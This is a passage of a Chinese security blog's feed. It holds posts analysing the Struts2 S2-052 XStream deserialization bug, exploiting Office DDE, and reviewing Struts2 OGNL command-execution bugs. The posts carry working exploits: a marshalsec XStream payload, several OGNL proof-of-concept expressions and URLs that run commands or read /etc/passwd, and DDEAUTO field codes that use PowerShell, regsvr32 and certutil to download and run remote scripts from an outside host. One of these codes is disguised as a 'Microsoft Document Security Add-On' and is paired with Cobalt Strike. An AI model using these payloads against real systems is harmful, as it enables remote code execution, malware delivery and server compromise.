    <published>2018-01-24T06:57:00.000Z</published>
    <updated>2019-10-20T15:15:05.000Z</updated>
    
    <content type="html"><![CDATA[<p>很久以前的洞了，一直没时间分析，拖延症晚期o(╯□╰)o</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>2017年9月5日，Apache Struts 2官方发布一个严重级别的安全漏洞<a href="https://cwiki.apache.org/confluence/display/WW/S2-052" target="_blank" rel="noopener">公告</a>，该漏洞由国外安全研究组织lgtm.com的安全研究人员发现，漏洞编号为CVE-2017-9805（S2-052）,在一定条件下，攻击者可以利用该漏洞远程发送精心构造的恶意数据包，获取业务数据或服务器权限，存在高安全风险。<br>当Struts2使用REST插件使用XStream的实例xstreamhandler处理反序列化XML时没有进行任何过滤，可以导致远程执行代码，攻击者可以利用该漏洞构造恶意的XML内容获取服务器权限。目前来说xml反序列化有两种，一种是XMLDecoder，另外一下是使用xstream。<br>利用条件：使用REST插件并在受影响版本范围内。<br>利用方式：攻击者构建恶意数据包远程利用。<br>影响版本：Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>下载<a href="https://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-all.zip" target="_blank" rel="noopener">struts-2.5.12-all.zip</a>，将struts-2.5.12\src\apps\目录下的rest-showcase导入idea，再配置下project structure，如下<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/04/3009368010.png" alt="s2052-1.png"></p><p>根据官方公告知道该漏洞出现在xstreamhandler类，定位到该类，发现在struts2-rest-plugin-2.5.12.jar包内<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/04/686899027.png" alt="s2052-2.png"></p><p>在toObject()处下一个断点，进行调试，发现其上层调用栈中，ContentTypeInterceptor类会根据请求的Content-Type选择对应的Handler进行处理。并且struts2-rest-plugin-2.5.12.jar的struts-plugin.xml配置文件是当Content-Type为xml会调用XStreamHandler类进行处理<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/04/2878015388.png" alt="s2052-5.png"></p><p>所有当Content-Type为”application/xml”时，就会调用XStreamHandler.toObject()，在toObject()中调用 XStream.fromXML()对xml的内容进行反序列化，并且XStream没有对Reader做任何过滤处理。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/04/1775531748.png" alt="s2052-3.png"></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/04/3291804868.png" alt="s2052-4.png"></p><p>所以整个流程是：</p><pre><code>发起请求 -&gt; ContentTypeInterceptor判断Content-Type -&gt;若Content-Type:application/xml -&gt;调用XStreamHandler.toObject()对xml数据流进行反序列化</code></pre><p>过程已经很清晰明了，现在开始漏洞复现</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>这里使用<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a>构造生成payload</p><pre><code>java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.XStream ImageIO &quot;calc&quot; &gt; poc.xml</code></pre><p>payload如下:</p><pre><code>&lt;map&gt;  &lt;entry&gt;    &lt;jdk.nashorn.internal.objects.NativeString&gt;      &lt;flags&gt;0&lt;/flags&gt;      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;        &lt;dataHandler&gt;          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;                &lt;initialized&gt;false&lt;/initialized&gt;                &lt;opmode&gt;0&lt;/opmode&gt;                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;                      &lt;command&gt;                        &lt;string&gt;calc&lt;/string&gt;                      &lt;/command&gt;                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;                    &lt;/next&gt;                  &lt;/iter&gt;                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;                    &lt;method&gt;                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;                      &lt;name&gt;start&lt;/name&gt;                      &lt;parameter-types/&gt;                    &lt;/method&gt;                    &lt;name&gt;foo&lt;/name&gt;                  &lt;/filter&gt;                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;                &lt;/serviceIterator&gt;                &lt;lock/&gt;              &lt;/cipher&gt;              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;              &lt;ibuffer&gt;&lt;/ibuffer&gt;              &lt;done&gt;false&lt;/done&gt;              &lt;ostart&gt;0&lt;/ostart&gt;              &lt;ofinish&gt;0&lt;/ofinish&gt;              &lt;closed&gt;false&lt;/closed&gt;            &lt;/is&gt;            &lt;consumed&gt;false&lt;/consumed&gt;          &lt;/dataSource&gt;          &lt;transferFlavors/&gt;        &lt;/dataHandler&gt;        &lt;dataLen&gt;0&lt;/dataLen&gt;      &lt;/value&gt;    &lt;/jdk.nashorn.internal.objects.NativeString&gt;    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;  &lt;/entry&gt;  &lt;entry&gt;    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;  &lt;/entry&gt;&lt;/map&gt;</code></pre><p>访问<a href="http://localhost:8088/orders/3/edit中点击Submit，burp抓包，将请求内容改为Payload，Content-Type" target="_blank" rel="noopener">http://localhost:8088/orders/3/edit中点击Submit，burp抓包，将请求内容改为Payload，Content-Type</a> Header改为application/xml，即可对请求内容进行反序列化<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/04/1255642244.png" alt="s2052-6.png"></p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>1.<a href="https://github.com/apache/struts/commit/19494718865f2fb7da5ea363de3822f87fbda264" target="_blank" rel="noopener">官方补丁</a>，官方的修复方案中,主要就是将xml中的数据白名单化，把Collection和Map，一些基础类，时间类放在白名单中，这样就能阻止XStream反序列化的过程中带入一些有害类<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/04/2572319399.png" alt="s2052-7.png"></p><p>2.Version 2.3.0 to 2.3.33升级到Struts 2.3.34版本，Version 2.5.0 to 2.5.12升级到Struts 2.5.13版本</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>1.<a href="http://kingx.me/Struts2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90S2-052/" target="_blank" rel="noopener">Struts2 S2-052与XStream漏洞调试分析</a><br>2.<a href="http://xxlegend.com/2017/09/06/S2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81/" target="_blank" rel="noopener">S2-052漏洞分析及官方缓解措施无效验证</a><br>3.<a href="https://yaofeifly.github.io/2017/09/08/Struts2-052/" target="_blank" rel="noopener">Struts2-052漏洞分析</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;很久以前的洞了，一直没时间分析，拖延症晚期o(╯□╰)o&lt;/p&gt;
&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;2017年9月5日，Apache Struts 2官方发布一个严重级
      
    
    </summary>
    
    
      <category term="vul-analysis" scheme="http://zerokeeper.github.io/categories/vul-analysis/"/>
    
    
      <category term="struts2" scheme="http://zerokeeper.github.io/tags/struts2/"/>
    
  </entry>
  
  <entry>
    <title>OFFICE DDE利用</title>
    <link href="http://zerokeeper.github.io/penetration/office-dde-utilization.html"/>
    <id>http://zerokeeper.github.io/penetration/office-dde-utilization.html</id>
    <published>2017-10-26T21:21:00.000Z</published>
    <updated>2019-10-20T15:15:05.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote><p>Windows 为应用之间进行数据传输提供了多种传输方式，其中一种叫做动态交换协议，我们简称它为DDE协议。DDE协议其实就是一套信息与指导参考。它在共享数据的应用程序之间发送消息，并使用共享内存在应用程序之间进行数据交换。应用程序可以使用DDE协议进行一次性数据传输和持续交换，应用程序在新的数据可用时，会将更新发送给彼此。</p></blockquote><p>  可以通过office使用DDE来执行命令，这样可以不用启用宏。</p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>  新建Word文档，Ctrl+F9添加一个域，然后修改域代码为</p><pre><code>DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k calc.exe&quot;</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2017/10/4001482993.png" alt="Snipaste_2017-10-27_12-50-01.png"></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2017/10/3424451389.gif" alt="请输入图片描述"></p><p>其它的一些payload</p><pre><code>DDEAUTO c:\\Windows\\System32\\cmd.exe &quot;/k powershell.exe -w hidden -nop -ep bypass Start-BitsTransfer -Source &quot;http://willgenovese.com/hax/index.js&quot;; -Destination &quot;index.js&quot; &amp; start c:\\Windows\System32\cmd.exe /c cscript.exe index.js&quot;DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k regsvr32 /s /n /u /i:http://willgenovese.com/hax/calc.sct scrobj.dll &quot;DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k certutil -urlcache -split -f http://willgenovese.com/hax/test.exe &amp;&amp; test.exe&quot;DDEAUTO c:\\Windows\\System32\\cmd.exe &quot;/k powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString(&apos;http://willgenovese.com/hax/evil.ps1&apos;);powershell -e $e &quot;DDEAUTO &quot;C:\\Programs\\Microsoft\\Office\\MSWord\\..\\..\\..\\..\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden IEX (New-Object System.Net.WebClient).DownloadString(&apos;http://willgenovese.com/hax/evil.ps1&apos;); # &quot; &quot;Microsoft Document Security Add-On&quot;</code></pre><p>进一步利用，这里结合cobalt strike，这里使用的是这个payload</p><pre><code>DDEAUTO &quot;C:\\Programs\\Microsoft\\Office\\MSWord\\..\\..\\..\\..\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden IEX (New-Object System.Net.WebClient).DownloadString(&apos;http://willgenovese.com/hax/evil.ps1&apos;); # &quot; &quot;Microsoft Document Security Add-On&quot;</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2017/10/2202195782.gif" alt="333333.gif"></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2017/10/3595963101.png" alt="Snipaste_2017-10-27_13-41-48.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>  OFFICE DDE优点是不用启用宏，缺点是要点击两次确认才会执行。希望以后能发现有更好的利用方式。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol><li><a href="http://willgenovese.com/office-ddeauto-attacks/" target="_blank" rel="noopener">Office DDEAUTO attacks</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;Windows 为应用之间进行数据传输提供了多种传输方式，其中一种叫做动态交换协议，我们简称它为DDE协议。DDE
      
    
    </summary>
    
    
      <category term="penetration" scheme="http://zerokeeper.github.io/categories/penetration/"/>
    
    
      <category term="office" scheme="http://zerokeeper.github.io/tags/office/"/>
    
      <category term="代码执行" scheme="http://zerokeeper.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
      <category term="cobalt strike" scheme="http://zerokeeper.github.io/tags/cobalt-strike/"/>
    
  </entry>
  
  <entry>
    <title>Struts2命令执行系列回顾</title>
    <link href="http://zerokeeper.github.io/vul-analysis/struts2-command-execution-series-review.html"/>
    <id>http://zerokeeper.github.io/vul-analysis/struts2-command-execution-series-review.html</id>
    <published>2017-06-05T07:36:00.000Z</published>
    <updated>2019-10-20T15:15:05.000Z</updated>
    
    <content type="html"><![CDATA[<p>一直都想分析下Struts2命令执行系列的的漏洞，但是能力有限，对java、Struts2都不熟悉。后来偶然看到rickgray的<a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">分析文章</a>，尝试简单分析，做个记录o(╯□╰)o<br>这是Struts2官方的各个版本历史记录 <a href="http://struts.apache.org/docs/security-bulletins.html" target="_blank" rel="noopener">Security Bulletins</a><br>Struts2命令执行的原因都是是通过Ognl表达式执行java代码，最终实现命令执行。所以应该需要先了解ognl表达式。</p><h3 id="ongl表达式"><a href="#ongl表达式" class="headerlink" title="ongl表达式"></a>ongl表达式</h3><p>下面引用来自<a href="http://drops.wooyun.org/papers/340" target="_blank" rel="noopener">OGNL设计及使用不当造成的远程代码执行漏洞</a></p><blockquote><p>OGNL是Object-Graph Navigation Language的缩写，它是一种功能强大的表达式语言（Expression<br>Language，简称为EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。<br>OGNL三要素：(以下部分摘抄互联网某处,我觉得说得好)</p><ol><li>表达式（Expression）</li></ol><p>表达式是整个OGNL的核心，所有的OGNL操作都是针对表达式的解析后进行的。表达式会规定此次OGNL操作到底要干什么。我们可以看到，在上面的测试中，name、department.name等都是表达式，表示取name或者department中的name的值。OGNL支持很多类型的表达式，之后我们会看到更多。</p><ol start="2"><li>根对象（Root Object）</li></ol><p>根对象可以理解为OGNL的操作对象。在表达式规定了“干什么”以后，你还需要指定到底“对谁干”。在上面的测试代码中，user就是根对象。这就意味着，我们需要对user这个对象去取name这个属性的值（对user这个对象去设置其中的department中的name属性值）。</p><ol start="3"><li>上下文环境（Context）</li></ol><p>有了表达式和根对象，我们实际上已经可以使用OGNL的基本功能。例如，根据表达式对根对象进行取值或者设值工作。不过实际上，在OGNL的内部，所有的操作都会在一个特定的环境中运行，这个环境就是OGNL的上下文环境（Context）。说得再明白一些，就是这个上下文环境（Context），将规定OGNL的操作“在哪里干”。<br>OGN L的上下文环境是一个Map结构，称之为OgnlContext。上面我们提到的根对象（Root<br>Object），事实上也会被加入到上下文环境中去，并且这将作为一个特殊的变量进行处理，具体就表现为针对根对象（Root<br>Object）的存取操作的表达式是不需要增加#符号进行区分的。</p><p>表达式功能操作清单：</p><pre><code>1. 基本对象树的访问对象树的访问就是通过使用点号将对象的引用串联起来进行。例如：xxxx，xxxx.xxxx，xxxx. xxxx. xxxx. xxxx. xxxx2. 对容器变量的访问对容器变量的访问，通过#符号加上表达式进行。例如：#xxxx，#xxxx. xxxx，#xxxx.xxxxx. xxxx. xxxx. xxxx3. 使用操作符号OGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用 +, -, *, /, ++, --, ==, !=, = 等操作符之外，还能使用 mod, in, not in等。4. 容器、数组、对象OGNL支持对数组和ArrayList等容器的顺序访问：例如：group.users[0]同时，OGNL支持对Map的按键值查找：例如：#session[&apos;mySessionPropKey&apos;]不仅如此，OGNL还支持容器的构造的表达式：例如：{&quot;green&quot;, &quot;red&quot;, &quot;blue&quot;}构造一个List，#{&quot;key1&quot; : &quot;value1&quot;, &quot;key2&quot; : &quot;value2&quot;, &quot;key3&quot; : &quot;value3&quot;}构造一个Map你也可以通过任意类对象的构造函数进行对象新建：例如：new Java.net.URL(&quot;xxxxxx/&quot;)5. 对静态方法或变量的访问要引用类的静态方法和字段，他们的表达方式是一样的@class@member或者@class@method(args)：例如：@com.javaeye.core.Resource@ENABLE，@com.javaeye.core.Resource@getAllResources6. 方法调用直接通过类似Java的方法调用方式进行，你甚至可以传递参数：例如：user.getName()，group.users.size()，group.containsUser(#requestUser)7. 投影和选择OGNL支持类似数据库中的投影（projection） 和选择（selection）。投影就是选出集合中每个元素的相同属性组成新的集合，类似于关系数据库的字段操作。投影操作语法为 collection.{XXX}，其中XXX 是这个集合中每个元素的公共属性。例如：group.userList.{username}将获得某个group中的所有user的name的列表。选择就是过滤满足selection 条件的集合元素，类似于关系数据库的纪录操作。选择操作的语法为：collection.{X YYY}，其中X 是一个选择操作符，后面则是选择用的逻辑表达式。而选择操作符有三种：? 选择满足条件的所有元素^ 选择满足条件的第一个元素$ 选择满足条件的最后一个元素例如：group.userList.{? #txxx.xxx != null}将获得某个group中user的name不为空的user的列表。</code></pre></blockquote><p>所以理论上外部某些参数能够进入OGNL流程，那么可以执行恶意代码，而且Struts2大量地使用了OGNL，导致漏洞触发率大大增加。</p><h3 id="触发途径"><a href="#触发途径" class="headerlink" title="触发途径"></a>触发途径</h3><p>通过对一系列的struts2的poc观察，一般是通过修改StaticMethodAccess或是创建ProcessBuilder对象。</p><pre><code>#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true // 用来授权允许调用静态方法或new java.lang.ProcessBuilder(new java.lang.String[]{&apos;cat&apos;,&apos;/etc/passwd&apos;})).start()</code></pre><p>但struts2加强了ognl的验证，allowStaticMethodAccess已经变成的final属性，但是任然有方法可以绕过。</p><h3 id="s2-001"><a href="#s2-001" class="headerlink" title="s2-001"></a>s2-001</h3><blockquote><p>官方链接：<a href="https://struts.apache.org/docs/s2-001.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-001.html</a> </p><p>影响版本：Struts 2.0.0 -Struts 2.0.8 </p><p>修复摘要：数据 re-display 时禁止执行 OGNL 表达式</p><p>该漏洞其实是因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value}<br>进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value}对提交的数据执行了一次 OGNL 表达式解析。</p></blockquote><p>Poc:<br>获取tomcat执行路径:</p><pre><code>%{&quot;tomcatBinDir{&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;}&quot;}</code></pre><p>获取Web路径:</p><pre><code>%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&apos;/&apos;)),#response.flush(),#response.close()}</code></pre><p>命令执行：</p><pre><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;whoami&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/s2-001.png" alt=""></p><h3 id="s2-007"><a href="#s2-007" class="headerlink" title="s2-007"></a>s2-007</h3><blockquote><p>官方链接：<a href="https://struts.apache.org/docs/s2-007.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-007.html</a></p><p>影响版本：Struts 2.0.0 - Struts 2.2.3</p><p>修复摘要：在转换的过程中进行字符过滤</p><p>修复补丁：<a href="https://fisheye6.atlassian.com/changelog/struts?cs=b4265d369dc29d57a9f2846a85b26598e83f3892" target="_blank" rel="noopener">https://fisheye6.atlassian.com/changelog/struts?cs=b4265d369dc29d57a9f2846a85b26598e83f3892</a></p><p>当配置了验证规则 <ActionName>-validation.xml<br>时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。例如这里有一个<br>UserAction：</p><pre><code>(...)public class UserAction extends ActionSupport {    private Integer age;    private String name;    private String email;(...)</code></pre><p>然后配置有 UserAction-validation.xml：</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE validators PUBLIC    &quot;-//OpenSymphony Group//XWork Validator 1.0//EN&quot;    &quot;http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd&quot;&gt;&lt;validators&gt;    &lt;field name=&quot;age&quot;&gt;        &lt;field-validator type=&quot;int&quot;&gt;            &lt;param name=&quot;min&quot;&gt;1&lt;/param&gt;            &lt;param name=&quot;max&quot;&gt;150&lt;/param&gt;        &lt;/field-validator&gt;    &lt;/field&gt;&lt;/validators&gt;</code></pre><p>当用户提交 age 为字符串而非整形数值时，后端用代码拼接 “‘“ + value + “‘“ 然后对其进行 OGNL<br>表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意<br>OGNL 表达式。</p></blockquote><p>Poc:</p><pre><code>&apos; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;whoami&apos;).getInputStream())) + &apos;</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/s2-007.png" alt=""></p><h3 id="s2-008"><a href="#s2-008" class="headerlink" title="s2-008"></a>s2-008</h3><blockquote><p>官方链接：<a href="https://struts.apache.org/docs/s2-008.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-008.html</a></p><p>影响版本：Struts 2.1.0 - Struts 2.3.1</p><p>修复摘要：添加参数名和 Cookie 名白名单 acceptedParamNames = “[a-zA-Z0-9.][()_’]+”;</p><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对<br>Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启<br>devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx<br>所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug<br>模式的应用到服务器上作为后门也是有可能的。</p><p>例如在 devMode 模式下直接添加参数 ?debug=command&amp;expression=<OGNL EXP> 会直接执行后面的<br>OGNL 表达式，因此可以直接执行命令（注意转义）：</p></blockquote><p>Poc:</p><pre><code>http://localhost:8080/S2-008/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29)</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/s2-008png" alt=""></p><h3 id="s2-012"><a href="#s2-012" class="headerlink" title="s2-012"></a>s2-012</h3><blockquote><p>官方链接：<a href="https://struts.apache.org/docs/s2-012.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-012.html</a></p><p>影响版本：Struts 2.0.0 － Struts 2。3.13</p><p>修复摘要：默认禁用 OGNLUtil 类的 OGNL 表达式执行</p><p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p><pre><code>&lt;package name=&quot;S2-012&quot; extends=&quot;struts-default&quot;&gt;         &lt;action</code></pre><p>name=”user” class=”com.demo.action.UserAction”&gt;             <resultname="redirect" type="redirect">/index.jsp?name=${name}</result><br>            <result name="input">/index.jsp</result>             <resultname="success">/index.jsp</result>         </action>     </package> 这里<br>UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name}<br>获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行</p></blockquote><p>Poc:</p><pre><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;cat&quot;, &quot;/etc/passwd&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</code></pre><h3 id="s2-013-s2-014"><a href="#s2-013-s2-014" class="headerlink" title="s2-013/s2-014"></a>s2-013/s2-014</h3><blockquote><p>官方链接：<a href="https://struts.apache.org/docs/s2-013.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-013.html</a>,<br><a href="https://struts.apache.org/docs/s2-014.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-014.html</a></p><p>影响版本：Struts 2.0.0 - Struts 2.3.14 (Struts 2.3.14.1)</p><p>修复摘要：在对标签进行请求参数操作时禁用 OGNL 表达式解析 Struts2 标签中 &lt;s:a&gt; 和 &lt;s:url&gt; 都包含一个<br>includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：</p><p>none - 链接不包含请求的任意参数值（默认） get - 链接只包含 GET 请求中的参数和其值 all - 链接包含 GET 和<br>POST 所有参数和其值 若设置了 includeParams=”get” 或者<br>includeParams=”all”，在获取对应类型参数时后端会对参数值进行 OGNL 表达式解析，因此可以插入任意 OGNL<br>表达式导致命令执行</p></blockquote><p>Poc:</p><pre><code>${(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&apos;whoami&apos;).getInputStream(),#b=newjava.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=newchar[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}// 或${#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;whoami&apos;).getInputStream())}</code></pre><p>如:</p><pre><code>http://localhost:8080/S2-013/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&apos;whoami&apos;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(&apos;dbapp%3D&apos;%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/s2-013.png" alt=""></p><blockquote><p>S2-014 是对 S2-013 修复的加强，在 S2-013 修复的代码中忽略了 ${ognl_exp} OGNL 表达式执行的方式，因此<br>S2-014 是对其的补丁加强。</p></blockquote><pre><code>http://localhost:8080/S2-013/link.action?xxxx=%24%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29%29%7D</code></pre><h3 id="s2-015"><a href="#s2-015" class="headerlink" title="s2-015"></a>s2-015</h3><blockquote><p>官方链接：<a href="https://struts.apache.org/docs/s2-015.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-015.html</a></p><p>影响版本：Struts 2.0.0 - Struts 2.3.14.2</p><p>修复摘要：针对 Action 名称进行默认字符限制 [a-z][A-Z][0-9][.-_!/] 漏洞产生于配置了 Action 通配符<br>*，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：</p><pre><code>&lt;package name=&quot;S2-015&quot; extends=&quot;struts-default&quot;&gt;         &lt;action name=&quot;*&quot;</code></pre><p>class=”com.demo.action.PageAction”&gt;             <result>/{1}.jsp</result><br>        </action>     </package> 上述配置能让我们访问 name.action 时使用 name.jsp<br>来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name<br>值的位置比较特殊，一些特殊的字符如 / “ <br>都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。</p><p>还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了<br>SecurityMemberAccess 类中的  setAllowStaticMethodAccess 方法，因此在 2.3.14.2<br>版本以后都不能直接通过 #_memberAccess[‘allowStaticMethodAccess’]=true<br>来修改其值达到重获静态方法调用的能力。</p><p>这里为了到达执行命令的目的可以用 kxlzx 提到的调用动态方法 (new<br>java.lang.ProcessBuilder(‘calc’)).start() 来解决，另外还可以借助 Java 